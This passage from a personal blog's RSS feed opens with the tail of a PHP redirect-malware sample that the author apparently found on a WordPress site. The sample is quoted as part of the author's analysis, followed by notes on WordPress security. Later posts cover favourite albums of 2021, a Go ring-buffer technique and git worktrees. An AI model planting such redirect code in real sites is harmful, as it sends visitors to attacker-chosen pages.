            'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0','zyvox'
        );
    }

}

if (empty($_COOKIE['ssl_message'])) {
    $obj = new redir();

    if ($obj-&gt;redirekt and $obj-&gt;referer!=&quot;&quot;) {
        cookie();
    }
}

?&gt;&lt;?
</code></pre>
<h3>Summary</h3>
<p>Having auto-updates turned on in Wordpress won't keep you safe.  Any additional Wordpress plugin increases your risk of being vulnerable to Malware and other attacks.</p>
<p>This incident just undermined my presumption that Wordpress is inherently insecure and is not a good choice for small business and personal websites.  Owning a Wordpress based website makes you a system administrator, if you like it or not.  Building websites is not my profession, so I can't give any recommendations based on personal experience.  If someone would ask me to build them a website for their small business I would reach for some <a href="https://jamstack.org/">Jamstack</a> solution, like Netlify which provides a CMS but renders out static files.</p>
<p>Searching for the terms <code>wordpress remove malware</code> is no help at all.  Most of the results are just scam or they advertise shady &quot;malware scanner&quot; plugins that at best do nothing and <em>only</em> cost you money.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>I don't care about your opinion on cryptocurrencies.  It's a waste of energy and thanks to this 💩 technology we now see <del>people</del> idiots promoting web3 as being all the rage.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>There is an incredibly handy tool called <a href="https://gchq.github.io/CyberChef/">CyberChef</a> for applying chains of encodings and decodings to an input string.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><del>I need to file a GitHub issue so they can look for the actual security vulnerability.</del> I filed an <a href="https://github.com/WordPress/health-check/issues/425">issue</a>.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>(Almost) 30 Best Albums of 2021</title>
      <link>https://klingt.net/articles/almost-30-best-albums-of-2021.html</link>
      <description>A list of my favorite albums that were (mostly) released in 2021.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="A list of my favorite albums that were (mostly) released in 2021.">
  
  <title>(Almost) 30 Best Albums of 2021</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>(Almost 30) Best Albums of 2021</h1>
<p>Without further ado I admit being a music junkie.  I love discovering new music in my journey through online record stores or whenever I am in one of the local record shops.  One of the positive side effects of Covid was that people had more time listening to music and started buying records.  Vinyl sales were already on the rise over the past years, but the last two years has given them an extra boost that lead to new record stores popping up in Leipzig and elsewhere.</p>
<p>Stop buying crap, support your favorite artists instead!</p>
<h2>Roy Montgomery — 40th Anniversary 2021 LP Series</h2>
<p><img src="https://f4.bcbits.com/img/a1654242133_16.jpg" alt="Album Art of Roy Montgomery - 40th Anniversary 2021 LP Series"></p>
<p>Roy Montgomery.  <a href="https://grouper.bandcamp.com/">Grouper</a>'s 2009 <a href="https://www.discogs.com/master/214067-Roy-Montgomery-Grouper-Roy-Montgomery-Grouper">split EP</a> introduced me to the music of the New Zealand based guitarist and it also spawned my love for drone and ambient music.  I cannot exactly say what makes me love his music so much, but somehow the layered guitar tunes together with the ethereal reverb in the background create an atmosphere that makes me comfy, and which reminds of warm and sunny summer days that I spent in the country side (or that I just imagined while daydreaming).  For me it's just the perfect music to relax and drift away with my thoughts.</p>
<p>When <a href="https://www.grapefruitrecordclub.com/">Grapefruit Record Club</a> announced the 40th anniversary LP series I haven't given it a second thought and pre-ordered the vinyls the same day, planning to make myself a little christmas present.  But, shipping was delayed to January 2022 because of an unprecedented backup at pressing plants (<a href="https://www.vox.com/the-goods/2021/11/22/22797290/adele-vinyl-record-supply-chain-delays">damn you Adele!</a>).</p>
<p>Roy Montgomery might be best known for his work with Dadamah, an experimental rock/shoegaze group where he sang and played guitar.  Their sole album, <em>This is Not a Dream</em>, contains two tracks that still give me goosebumps whenever I listen to them, <a href="https://badabingrecords.bandcamp.com/track/too-hot-to-dry-2">Too Hot to Dry</a> and <a href="https://badabingrecords.bandcamp.com/track/high-tension-house-2">High Tension House</a>.  His music is melancholic while being still positive, hard to describe.  This tension might be the reason I'm so fascinated by it.</p>
<p>In an interview, I read about him, he said that he is a self-taught guitarist. This gives me hope that I can sometimes create similar atmospheres on my guitar.  One of my new year's resolutions is to finally take guitar lessons, no excuses anymore.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2966139599/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://grapefruit1.bandcamp.com/album/roy-montgomery-40th-anniversary-2021-lp-series">Roy Montgomery 40th Anniversary 2021 LP Series by Roy Montgomery</a></iframe>
<h2>Skee Mask — Pool</h2>
<p><img src="https://f4.bcbits.com/img/a2320122722_16.jpg" alt="Album Art of Skee Mask - Pool"></p>
<p>Another good year for Ilian Tape, a <a href="https://taz.de/Muenchner-Technolabel-Ilian-Tape/!5654614/">munich based techno label managed by the Zenker brothers</a> who are best known for their minimal techno releases.  This is not the first album of Skee Mask but a massive one, with more than one hundred minutes of listening time.  There are no fillers on this record, every track is worth a listen.  I would describe the album as a mixture of low-speed drum and bass, breakbeat and deep techno (it's okay to disagree with that, genre borders are fluid).  Not a record to listen on your kitchen radio though, this needs some headphones or speakers capable of producing a massive amount of low end.  Highly recommended record and maybe a future classic.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=222624053/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://iliantape.bandcamp.com/album/itlp09-pool">ITLP09 - Pool by Skee Mask</a></iframe>
<h2>Woulg - Bubblegum</h2>
<p><img src="https://f4.bcbits.com/img/a3596139616_16.jpg" alt="Album Art of Woulg - Bubblegum"></p>
<p>An album for the open minded electronic music lovers.  A potpourri of glitched, broken up and detuned samples sprinkled on top of blazing fast, metallic breaks with deep and earth shattering bass drums every once in a while.  Woulg is not only a talented IDM or breakcore producer, he also shows some of his producing techniques on <a href="https://www.youtube.com/user/woulg">YouTube</a>.  He released his first record on the infamous <a href="https://www.discogs.com/label/55101-illphabetik?page=2">illphabetik</a> breakcore netlabel, home of <a href="https://archive.org/details/ill030">Lisbent</a>.</p>
<p>The album cover should leave no doubt that this is nothing for the faint-hearted.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4125215390/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://woulg.bandcamp.com/album/bubblegum">Bubblegum by woulg</a></iframe>
<h2>Dean McPhee - Witch's Ladder</h2>
<p><img src="https://f4.bcbits.com/img/a0181296910_16.jpg" alt="Album Art of Dean McPhee - Witch's Ladder"></p>
<p>Over to something completely different to the above (and below) albums.  Dean McPhee, a UK based solo ambient and folk guitarist which I discovered through his previous record called <a href="https://deanmcphee.bandcamp.com/album/four-stones">Four Stones</a>.  Witch's Ladder is inspired by folklore, mysticism and the beautiful, wide open and lonely landscapes of northern England.</p>
<p>An album best listened to on a quiet evening with a wood fire or while watching the world fly by through a train window.  Enjoy.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3681494736/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://deanmcphee.bandcamp.com/album/witchs-ladder">Witch&#39;s Ladder by Dean McPhee</a></iframe>
<h2>Stazma the Junglechrist</h2>
<h3>Stazma — Leftovers</h3>
<p><img src="https://f4.bcbits.com/img/a0248618665_16.jpg" alt="Album Art of Stazma - Leftovers"></p>
<p>Stazma's leftovers are better than some other's best productions.  I have a soft spot for blazing breakcore beats, especially when they incorporate well versed rapping or funky Squarepusher'esque basslines on top.  There are dozens of excellent breakcore producers in France, <a href="https://rubymydear.bandcamp.com/">Ruby my Dear</a> or <a href="https://igorrr.bandcamp.com/">Igorrr</a> for example.  Still, Stazma is a master of his craft and shares his production techniques, like Woulg, with the rest of the world on <a href="https://www.youtube.com/channel/UCOiJihb6aQyKch4FDST3niw">YouTube</a>.</p>
<p>If you haven't gotten bored by the Amen break yet, and if you like hard and fast break beats then this is something you should listen to.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4185536392/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://stazma-the-junglechrist.bandcamp.com/album/leftovers">Leftovers by Stazma</a></iframe>
<h3>Repeat Eater — Deep Dessert Dweller</h3>
<p><img src="https://f4.bcbits.com/img/a0219005911_16.jpg" alt="Album Art of Repeat Eater - Deep Desert Dweller"></p>
<p>We aren't done with Stazma yet, even though this record was released under his alter ego <em>Repeat Eater</em>.  He produces detroit style techno or electro under this moniker.  The album was inspired by Frank Herbert's Dune, a story that received a <a href="https://www.youtube.com/watch?v=n9xhJrPXop4">very fine movie remake</a> this year.</p>
<p>Perfect music for driving on the Autobahn or to dance alone in your living room until the clubs reopen.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2268299090/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://touched.bandcamp.com/album/deep-desert-dweller">Deep Desert Dweller by Repeat Eater</a></iframe>
<h2>Harold Budd — Abandoned Cities</h2>
<p><img src="https://f4.bcbits.com/img/a2697139059_16.jpg" alt="Album Art of Harold Budd - Abandoned Cities"></p>
<p>Yet another album from a master of his genre.  Not a 2021 release, strictly speaking, but a re-release of Harold Budds' 1984 record <em>Abandoned Cities</em>.  This one is much darker than his other works and reminds me a bit of the early <a href="https://www.discogs.com/artist/10343-Tangerine-Dream">Tangerine Dream</a>.  Most mystery or sci-fi movies would benefit from a soundtrack like this.</p>
<p>A soundtrack for being outside on a starry night, but only if you're not afraid of the dark.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2344114403/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://haroldbudd.bandcamp.com/album/abandoned-cities">Abandoned Cities by Harold Budd</a></iframe>
<h2>Clark — Playground in a Lake</h2>
<p><img src="https://throttleclark.com/wp-content/uploads/2021/04/218911-2.png" alt="Album Art of Clark - Playground in a Lake"></p>
<p>Playground in a Lake, released on <a href="https://www.deutschegrammophon.com/">Deutsche Grammophon</a>, is a special album for Clark's standards.  The record starts with a cello melody that reminds me of <a href="https://www.youtube.com/watch?v=xULTMMgwLuo">The Elder Scrolls: Morrowind</a><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> soundtrack, which has to be taken as a compliment, I really like that one.  Clark, previously producing IDM or braindance records on <a href="https://warp.net/">Warp</a>, releases a very solid contemporary classic album here, that involves all his experience, with epic sound walls, catchy melodies and mysterious vibes alike.</p>
<p>This is a record for people pretending not to like classical music but are overwhelmed by good old Hollywood soundtracks.</p>
<p><a href="https://throttleclark.com/album/playground-in-a-lake/">https://throttleclark.com/album/playground-in-a-lake/</a></p>
<h2>Tommy Guerrero — Sunshine Radio</h2>
<p><img src="https://f4.bcbits.com/img/a1891857574_16.jpg" alt="Album Art of Tommy Guerrero - Sunshine Radio"></p>
<p>The californian Tommy Guerrero, former pro skateboarder, now a professional musician is living the dream (at least I hope he does &#x1f605;).  His music is best described as a fusion of Instrumental Rock, Jazz, Funk and Downtempo<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> influenced by hot shimmering air, cacti, yucca, agaves and tequila at sundown.  Okay, that's just my mental picture of his music but I still think it gives you an idea of what to expect.</p>
<p>Hear this, or his other records, if you want to get in a good mood or if you want to relax on a hot summer evening.  Best listened to with friends, some beers and a joint &#x1f33f;.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=374561757&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h2>Loscil — Clara</h2>
<p><img src="https://f4.bcbits.com/img/a3445442629_16.jpg" alt="Album Art of Loscil - Clara"></p>
<p>An ambient gem released on <a href="https://kranky.bandcamp.com/">Kranky</a>, one of the few record labels I really admire because of their consistently great output.  Loscil has a large back catalogue of great ambient albums, and this one is no different.  Sourced from a three minute record of an Hungarian twenty-two string orchestra the album has a more natural touch than ambient records produced completely inside the box, i.e. by software synths.  Nothing against software synths and artificial sounds, but sometimes sampling real instruments gives the little touch which makes a good album into a great one.</p>
<p>Perfect album to listen to on a trip to Scandinavia or Canada in autumn or winter months.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4149141204/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://loscil.bandcamp.com/album/clara">Clara by loscil</a></iframe>
<h2>Simon Farintosh — Aphex Twin for Guitar</h2>
<p><img src="https://www.thisisclassicalguitar.com/wp-content/uploads/2021/02/Aphex-Twin-Guitar-Farintosh-1024x924.png" alt="Album Art of Simon Farintosh - Aphex Twin for Guitar"></p>
<p>There are not many artists that had a greater influence on my music taste and life in general than <a href="https://aphextwin.warp.net/">Aphex Twin</a>, <a href="https://autechre.warp.net/">Autechre</a> and <a href="https://venetiansnares.bandcamp.com/">Venetian Snares</a>.  I love everything they do and especially what they did.  In 2005 <em>Alarm Will Sound</em> released <a href="https://alarmwillsound.bandcamp.com/album/acoustica">Acoustica</a>, an orchestral interpretation of Aphex' early work.  No different is this record of Simon Farintosh, another UK based guitarist.</p>
<p>Listen to this if you like Aphex Twin, if not listen to it as well.  You don't have a choice.</p>
<p><a href="https://open.spotify.com/album/0mhEjBVbHDLAhwGD9ZydfY?si=HRzrCHMhRdegQ3VzXqzbVg&amp;nd=1">https://open.spotify.com/album/0mhEjBVbHDLAhwGD9ZydfY?si=HRzrCHMhRdegQ3VzXqzbVg&amp;nd=1</a></p>
<]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Reading the last bytes of a stream in Go</title>
      <link>https://klingt.net/articles/reading-the-last-bytes-of-a-stream-in-go.html</link>
      <description>In this post I explain how to efficiently read the last bytes of a stream of file, just like the good old tail utility.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="In this post I explain how to efficiently read the last bytes of a stream of file, just like the good old tail utility.">
  
  <title>Reading the last bytes of a stream in Go</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Reading the last bytes of a stream in Go</h1>
<p>It's about half a year since my last blog post, so it's about time to write another one.</p>
<p>Yesterday I was working on a private project that required to read a block of bytes from the end of an <code>io.Reader</code>.
On a first glance that sounds like a trivial problem, but doing this <em>efficiently</em> turned out to be more complicated than initially thought.</p>
<p>If your <code>io.Reader</code> stems from a file you're lucky, because regular files allow random access through the system <a href="https://man7.org/linux/man-pages/man2/lseek.2.html">seek call</a> that is exposed on a <code>os.File</code> with its <a href="https://pkg.go.dev/os#File.Seek"><code>Seek</code> method</a>.  However, my function only accepts a plain <code>io.Reader</code> and not an <code>os.File</code>, so this option is out of question.</p>
<p>How can we read the last N bytes of a <em>finite</em> stream of some kind?</p>
<h2>Naïve solution</h2>
<p>A naïve solution would be to <a href="https://pkg.go.dev/io#ReadAll">read the whole file into memory</a> and then discard everything except for some slice of bytes at the end.</p>
<pre><code class="language-go">func readTail(r io.Reader, N int) ([]byte, error) {
	data, err := io.ReadAll(r)
	if err != nil {
		return nil, err
	}

	return data[len(data)-N:], nil
}
</code></pre>
<p>This is pretty wasteful and might require huge amounts of memory, depending on how long the stream you want to consume is.</p>
<h2>Two interleaved buffers</h2>
<p>The next idea I had was to read the stream in chunks of size N, and discarding every chunk except the last one.
But this won't work because of a variety of reasons, first and foremost if the stream length is not an integer multiple of N then the last chunk might be incomplete since it is only the remainder of file size divided by chunk size (N).</p>
<p><img src="unalinged-end-of-file-read.png" alt="illustration of an unaligned read"></p>
<p>So, why not maintain two buffers, one for the previous read and another one for the current read.
When reaching EOF we can then concatenate the second last read with the last and return an slice of size N, right?
This might work, but turns out to be pretty complicated because of how <code>io.Read</code> might behave.
A call to <code>Read</code> is not guaranteed to return <code>N</code> bytes, instead it might fill only a <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19.2:src/io/io.go;l=60-61">part of the given buffer</a>:</p>
<pre><code class="language-go">// If some data is available but not len(p) bytes, Read conventionally
// returns what is available instead of waiting for more.
</code></pre>
<p>So, we can't easily fill the two buffers in an interleaved manner because a single read might not fill a whole buffer.
Of course, there's <a href="https://pkg.go.dev/io#ReadFull"><code>io.ReadFull</code></a> which takes care of reading exactly N bytes if available, but the logic would still be quite convoluted.</p>
<h2>Ring buffer</h2>
<p>After dabbling around for a while with the solution I had, I realized that what I wrote looked almost like a <a href="https://en.wikipedia.org/wiki/Circular_buffer">ring buffer</a>.
With a ring buffer, sometimes also called circular buffer, we only need O(n) space instead of O(2n) as required with the previous concept.
The gist is to store each chunk in a ring buffer, wrapping around if it exceeds the end of the ring buffers internal array.</p>
<p><img src="ring-buffer-end-of-file-read.png" alt="illustration of reading chunks with a ring buffer"></p>
<p>After we reached the end of the stream we can just return a slice from the ring buffer, starting from the write head and reaching back N bytes.
Those are two operations if we need to wrap around</p>
<pre><code class="language-go">copy(dst[:N-wpos], ringbuf[wpos:])
copy(dst[N-wpos:], ringbuf[:wpos])
</code></pre>
<p>where <code>wpos</code> is the index of the write head.</p>
<p>One thing that bit me was that <code>io.Read</code> might return <code>io.EOF</code> together with a non-zero amount of bytes read, <em>or</em> it could return <code>0, io.EOF</code> after the last call that returned a non-zero amount of bytes and a <code>nil</code> error.
This is <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19.2:src/io/io.go;l=83">documented behavior</a> but could still be surprising.</p>
<pre><code class="language-go">// An instance of this general case is that a Reader returning
// a non-zero number of bytes at the end of the input stream may
// return either err == EOF or err == nil. The next Read should
// return 0, EOF.
</code></pre>
<p>You can find an ugly example in <a href="https://go.dev/play/p/M-WcpkVviGV">this playground</a> but be aware that you need to run it locally, since external URLs might not be resolved in the playground.</p>
<p>There are a number of performance considerations that arise from this implementation, e.g. a very small <code>N</code> might lead to a huge number of read calls if the ring buffer's size is equal to <code>N</code>.
Technically they are independent, the only condition is that the ring buffer must at least have a size of <code>N</code>.</p>
<p>You might've guessed it already but the good old <code>tail</code> utility serves the same purpose.  I haven't had a look in <a href="https://github.com/coreutils/coreutils/blob/master/src/tail.c">GNU tail's source code</a> yet, but I'm curious to see how they achieved this.</p>
<p>I hope that helped someone.
Please let me know if you've an even more efficient solution or there is any other feedback for me.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Git Worktrees</title>
      <link>https://klingt.net/articles/git-worktrees.html</link>
      <description>Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.">
  
  <title>Git Worktrees</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<p>Please see the <a href="./git-worktrees-update.html">updated version of this article</a>.  On GitHub you can still find the <a href="https://github.com/klingtnet/klingtnet.github.io/blob/c800968678ffda04ec8a0cab04f28b7774dcefef/content/articles/2022-10-07-git-worktree.md">original version</a>.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Git Worktrees (Update)</title>
      <link>https://klingt.net/articles/git-worktrees-update.html</link>
      <description>Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.">
  
  <title>Git Worktrees (Update)</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Git Worktrees</h1>
<p>At work I often face the situation that I want to locally review some feature branch of a colleague.
In general that's easy, one <code>git switch --track origin/branch-name</code> later and you have the changes in your local repository.
However, most of the time I was currently working in my own feature branch where I had unstaged changes.
This means I needed to commit my local changes before I could switch to the colleague's branch.
Wouldn't it be nice if I could work on multiple branches of a repository at the same time?</p>
<p>You might be tempted to say, I know how to do that, just make a second clone of the repository and call it a day.
That would work, of course, but it'd also be very wasteful since the whole repository needs to be cloned twice.
For large repositories this could mean duplicating hundreds or thousands of megabytes.
But guess what, git got you covered!  There's a lesser known command that handles exactly this use case, it's <a href="https://git-scm.com/docs/git-worktree">git worktree</a>.</p>
<p>There's a variety of ways how to use git worktrees.</p>
<h2>Existing repository</h2>
<p>Let's assume that you're in some repository that you cloned a while a go and now you want to switch to a different branch without having to commit your local changes.
We can do that by creating a new <em>worktree</em> like this:</p>
<pre><code class="language-sh">$ git worktree add ../repository.feat-x origin/feat-x
</code></pre>
<p>This will create a copy, which shares the same <code>.git</code> data, in <code>../repository.feat-x</code> at branch <code>origin/feat-x</code>.
It's sensible to not add the worktree inside the existing repository because then you would need to ignore the worktree directory.</p>
<p>Checking out a new branch when creating a worktree is also very easy, just pass <code>-b my-branch-name</code>, that's it.</p>
<p>If you're done with your work you can remove your worktree like</p>
<pre><code class="language-sh">$ rm -rf ../repository.feat-x
</code></pre>
<p>or run</p>
<pre><code class="language-sh">$ git worktree remove repository.feat-x
</code></pre>
<p>instead.
But <code>git worktree remove</code> should be preferred, otherwise some metadata will not be removed until a <code>git gc</code> or <code>git worktree prune</code> was run.</p>
<p>All worktrees of a repository can be listed with <code>git worktree list</code>.</p>
<h2>New repository layout</h2>
<p><strong>Update</strong>: In the <a href="https://github.com/klingtnet/klingtnet.github.io/blob/c800968678ffda04ec8a0cab04f28b7774dcefef/content/articles/2022-10-07-git-worktree.md">previous version of this article</a> I used a <a href="https://git-scm.com/docs/git-clone#Documentation/git-clone.txt---bare">bare repository</a> but this will lead to problems since this type of repository is not intended to be updated or track remote changes.  I did found another simple solution that I will explain below.</p>
<p>Let's say we want to patch something in the Go compiler on <code>master</code>, <code>1.19</code> and <code>1.18</code> branches.
We can setup the project like this:</p>
<pre><code class="language-sh">$ mkdir -p go/worktrees
$ cd go/worktrees
$ git clone git@github.com:golang/go master
$ cd master
# add the first worktree
$ git worktree add -B release-branch.go1.19 ../go1.19
# and the second worktree
$ git worktree add -B release-branch.go1.18 ../go1.18
</code></pre>
<p>What we end up with is a project structure like this</p>
<pre><code class="language-sh">$ tree -L 2 go
go
└── worktrees
    ├── go1.18
    ├── go1.19
    └── master
</code></pre>
<p>where each directory below <code>/worktrees</code> contains the repository at a different branch.</p>
<p>For work projects I could imagine a directory structure that looks similar to this:</p>
<pre><code class="language-sh">go
└── worktrees
    ├── master
    ├── feature
    └── review
</code></pre>
<p>Note that each worktree just acts like a copy of the repository, so I can switch to whatever branch I like, i.e. the worktree is not pinned to the branch it was created with.
In the example above I would use <code>work/</code> for my local feature development, <code>experiment/</code> for trying out some ideas, and <code>review/</code> whenever I need to checkout and review some feature of a colleague locally.</p>
<p>Let me know what your experience with git worktree is and if and how you use it.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Use your SSH key to sign git objects</title>
      <link>https://klingt.net/articles/use-your-ssh-key-to-sign-git-objects.html</link>
      <description>Since git 2.34 one can use an SSH key to sign a git object.  In this post I explain how to configure git to use an SSH key to sign a git object.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Since git 2.34 one can use an SSH key to sign a git object.  In this post I explain how to configure git to use an SSH key to sign a git object.">
  
  <title>Use your SSH key to sign git objects</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
